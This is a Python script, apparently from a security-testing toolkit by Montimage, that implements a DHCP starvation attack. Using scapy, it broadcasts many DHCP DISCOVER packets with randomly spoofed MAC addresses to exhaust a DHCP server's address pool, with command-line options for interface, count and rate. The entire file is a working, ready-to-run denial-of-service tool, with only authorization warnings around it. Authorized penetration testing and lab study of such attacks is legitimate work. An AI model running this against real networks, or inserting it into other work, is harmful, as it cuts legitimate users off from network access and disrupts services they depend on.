#!/usr/bin/env python3
"""
DHCP Starvation Attack Simulation

This module implements a DHCP starvation attack that exhausts the available IP addresses
in a DHCP server's address pool by sending numerous DHCP DISCOVER messages with spoofed
MAC addresses, causing the server to allocate all available IPs to fake clients.

IMPORTANT ETHICAL AND LEGAL NOTICE:
This tool should ONLY be used for legitimate security testing with proper authorization.
Unauthorized use is illegal and unethical.

Author: Montimage
License: Proprietary
Version: 1.0.0
"""

import os
import sys
import time
import random
import argparse
from typing import Dict, Any

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))
try:
    from logger import get_logger
except ImportError:
    import logging
    def get_logger(name):
        logger = logging.getLogger(name)
        if not logger.handlers:
            handler = logging.StreamHandler()
            formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
            handler.setFormatter(formatter)
            logger.addHandler(handler)
            logger.setLevel(logging.INFO)
        return logger

logger = get_logger(__name__)

try:
    from scapy.all import Ether, IP, UDP, BOOTP, DHCP, RandMAC, sendp, conf
except ImportError:
    logger.error("This script requires scapy. Install: pip install scapy")
    sys.exit(1)

conf.verb = 0


class DHCPStarvationAttack:
    """DHCP Starvation attack simulator."""

    def __init__(self, interface: str, count: int = 100, rate: int = 10, verbose: bool = False):
        self.interface = interface
        self.count = max(1, count)
        self.rate = max(1, rate)
        self.verbose = verbose
        self.delay = 1.0 / self.rate
        self.requests_sent = 0

        conf.verb = 1 if verbose else 0
        logger.info(f"Initialized DHCP starvation attack on {interface}")

    def create_dhcp_discover(self) -> Ether:
        """Create a DHCP DISCOVER packet with random MAC."""
        mac = str(RandMAC())

        ethernet = Ether(src=mac, dst="ff:ff:ff:ff:ff:ff")
        ip = IP(src="0.0.0.0", dst="255.255.255.255")
        udp = UDP(sport=68, dport=67)
        bootp = BOOTP(chaddr=[int(x, 16) for x in mac.split(":")])
        dhcp = DHCP(options=[("message-type", "discover"), "end"])

        packet = ethernet/ip/udp/bootp/dhcp

        if self.verbose:
            logger.debug(f"Created DHCP DISCOVER from MAC: {mac}")

        return packet

    def execute(self) -> Dict[str, Any]:
        """Execute the DHCP starvation attack."""
        logger.info(f"Starting DHCP starvation attack")
        logger.info(f"Sending {self.count} requests at {self.rate}/sec")

        start_time = time.time()

        try:
            for i in range(1, self.count + 1):
                packet = self.create_dhcp_discover()
                sendp(packet, iface=self.interface, verbose=0)
                self.requests_sent += 1

                if i % (self.count // 10 or 1) == 0:
                    logger.info(f"Progress: {i}/{self.count} requests sent")

                if self.delay > 0:
                    time.sleep(self.delay)

            logger.info("DHCP starvation attack completed")

        except KeyboardInterrupt:
            logger.warning("Attack interrupted")
        except Exception as e:
            logger.error(f"Error: {e}")
        finally:
            duration = time.time() - start_time
            stats = {
                "requests_sent": self.requests_sent,
                "duration_seconds": duration,
                "actual_rate": self.requests_sent / duration if duration > 0 else 0
            }
            self._print_summary(stats)
            return stats

    def _print_summary(self, stats: Dict[str, Any]):
        """Print attack summary."""
        logger.info("=" * 50)
        logger.info("DHCP Starvation Attack Summary")
        logger.info("=" * 50)
        logger.info(f"DHCP requests sent: {stats['requests_sent']}")
        logger.info(f"Duration: {stats['duration_seconds']:.2f} seconds")
        logger.info(f"Actual rate: {stats['actual_rate']:.2f} requests/second")
        logger.info("=" * 50)


def parse_arguments() -> argparse.Namespace:
    """Parse command-line arguments."""
    parser = argparse.ArgumentParser(
        description="DHCP Starvation Attack Simulation",
        epilog="IMPORTANT: Use only for authorized security testing."
    )

    parser.add_argument("-i", "--interface", required=True, help="Network interface")
    parser.add_argument("-c", "--count", type=int, default=100,
                       help="Number of DHCP requests (default: 100)")
    parser.add_argument("-r", "--rate", type=int, default=10,
                       help="Requests per second (default: 10)")
    parser.add_argument("-v", "--verbose", action="store_true", help="Verbose output")

    return parser.parse_args()


def main():
    """Main entry point."""
    print("=" * 80)
    print("WARNING: This tool is for AUTHORIZED SECURITY TESTING ONLY")
    print("=" * 80)
    print()

    try:
        args = parse_arguments()
        attack = DHCPStarvationAttack(
            interface=args.interface,
            count=args.count,
            rate=args.rate,
            verbose=args.verbose
        )
        attack.execute()
    except KeyboardInterrupt:
        print("\nInterrupted by user")
        sys.exit(0)
    except Exception as e:
        logger.error(f"Error: {e}")
        sys.exit(1)


if __name__ == "__main__":
    main()
